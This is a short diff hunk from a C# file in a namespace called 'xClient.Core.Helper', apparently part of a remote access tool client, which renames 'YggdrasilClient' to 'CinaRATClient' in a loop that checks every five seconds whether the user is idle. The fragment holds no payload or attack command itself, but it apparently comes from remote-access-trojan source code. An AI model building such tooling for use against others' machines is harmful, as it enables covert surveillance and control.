@@ -43,7 +43,7 @@ namespace xClient.Core.Helper
 
         static void UserIdleThread()
         {
-            while (!YggdrasilClient.Exiting)
+            while (!CinaRATClient.Exiting)
             {
                 Thread.Sleep(5000);
                 if (IsUserIdle())
